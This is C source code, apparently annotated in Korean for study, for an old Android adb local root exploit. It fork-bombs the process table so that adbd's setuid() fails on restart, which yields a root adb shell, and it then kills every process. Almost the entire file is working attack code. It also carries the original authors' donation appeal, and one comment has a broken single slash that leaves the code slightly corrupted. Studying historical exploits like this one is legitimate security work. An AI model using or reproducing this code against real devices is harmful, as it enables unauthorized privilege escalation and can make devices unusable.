/* android 1.x/2.x adb setuid() root exploit
 * (C) 2010 The Android Exploid Crew
 *
 * Needs to be executed via adb -d shell. It may take a while until
 * all process slots are filled and the adb connection is reset.
 *
 * !!!This is PoC code for educational purposes only!!!
 * If you run it, it might crash your device and make it unusable!
 * So you use it at your own risk!
 * fork-bomb를 통해서 분할된 프로세스에 프로세스 생성 제약을 초과할 때 발생하는 권한 상승(setuid=0)설정을 노리는 공격 익스플로잇입니다.
 */
#include <stdio.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>


// 프로세스 종결 함수.
void die(const char *msg)
{
	perror(msg);
	exit(errno);
}

// 프로세스 명령행에서 /sbin/adb가 맞는지 찾아서 리턴.
pid_t find_adb()
{
	char buf[256];
	int i = 0, fd = 0;
	pid_t found = 0;

	for (i = 0; i < 32000; ++i) {
		sprintf(buf, "/proc/%d/cmdline", i);
		if ((fd = open(buf, O_RDONLY)) < 0)
			continue;
		memset(buf, 0, sizeof(buf));
		read(fd, buf, sizeof(buf) - 1);
		close(fd);
		if (strstr(buf, "/sbin/adb")) { // /sbin/adb 프로세스 색인되면 pid를 found에 설정.
			found = i;
			break;
		}
        }
        return found; // /sbin/adb 프로세스 ID 반환.
}


// adb 리스타트 함수.
void restart_adb(pid_t pid)
{
	kill(pid, 9);
}


// find_adb로 루트쉘 adb 기능.
void wait_for_root_adb(pid_t old_adb)
{
	pid_t p = 0;

	for (;;) {
		p = find_adb(); // /sbin/adb 프로세스 ID 찾고,
		if (p != 0 && p != old_adb) // 찾은 프로세스 ID가 old_adb이면 브레이크.
			break;
		sleep(1);
	}
	sleep(5);
	kill(-1, 9); // 모든 프로세스 킬.
}


int main(int argc, char **argv)
{
	pid_t adb_pid = 0, p;
	int pids = 0, new_pids = 1;
	int pepe[2];
	char c = 0;
	struct rlimit rl;

	printf("[*] CVE-2010-EASY Android local root exploit (C) 2010 by 743C\n\n");
	printf("[*] checking NPROC limit ...\n");

	// getrlimit로 RLIMIT_NPROC 몇개의 프로세스가 한계치인지 rl 변수에 읽어옴.
	if (getrlimit(RLIMIT_NPROC, &rl) < 0)
		die("[-] getrlimit");

	/ rlimit_nproc가 설정되지 않았으면 익스플로잇이 되지 않음.
	if (rl.rlim_cur == RLIM_INFINITY) {
		printf("[-] No RLIMIT_NPROC set. Exploit would just crash machine. Exiting.\n");
		exit(1);
	}

	printf("[+] RLIMIT_NPROC={%lu, %lu}\n", rl.rlim_cur, rl.rlim_max);
	printf("[*] Searching for adb ...\n");

	// adb 프로세스의 pid 프로세스 아이디 찾음.
	adb_pid = find_adb();

	if (!adb_pid)
		die("[-] Cannot find adb");

	printf("[+] Found adb as PID %d\n", adb_pid);
	printf("[*] Spawning children. Dont type anything and wait for reset!\n");
	printf("[*]\n[*] If you like what we are doing you can send us PayPal money to\n"
	       "[*] 7-4-3-C@web.de so we can compensate time, effort and HW costs.\n"
	       "[*] If you are a company and feel like you profit from our work,\n"
	       "[*] we also accept donations > 1000 USD!\n");
	printf("[*]\n[*] adb connection will be reset. restart adb server on desktop and re-login.\n");

	// 5초 슬립.
	sleep(5);

	// 프로세스 1개 생성.
	if (fork() > 0)
		exit(0);

	// sid 설정.
	setsid();

	// 파이프 생성.
	pipe(pepe);

	/* generate many (zombie) shell-user processes so restarting
	 * adb's setuid() will fail.
	 * The whole thing is a bit racy, since when we kill adb
	 * there is one more process slot left which we need to
	 * fill before adb reaches setuid(). Thats why we fork-bomb
	 * in a seprate process.
	 */
	// 부모 프로세스일 때 pepe[0]) 입력을 닫고, 프로세스를 무한루프 내에서 생성
	if (fork() == 0) {
		close(pepe[0]);
		for (;;) {
			if ((p = fork()) == 0) {
				exit(0);
			} else if (p < 0) { // 자식 프로세스  일때.
				if (new_pids) {
					printf("\n[+] Forked %d childs.\n", pids);
					new_pids = 0;
					write(pepe[1], &c, 1); // 파이프 출력.
					close(pepe[1]);
				}
			} else {
				++pids; // 생성되는 pids 수를 체크.
			}
		}
	}

	// pepe[1] (출력 파이프)를 닫음.
	close(pepe[1]);
	// pepe[0] (입력 파이프)로부터 c에 1바이트 읽음.
	read(pepe[0], &c, 1);


	// adb 리셋. (취약점 트리거링).
	restart_adb(adb_pid);

	// 프로세스 두 번째 생성 (포크) 시도.
	if (fork() == 0) {
		fork(); // 자식 프로세스 포크.
		for (;;)
			sleep(0x743C);
	}

	// 자식 프로세스 일 때, adb리셋으로 루트쉘 뜨므로 대기 후 획득.
	wait_for_root_adb(adb_pid);
	return 0;
}

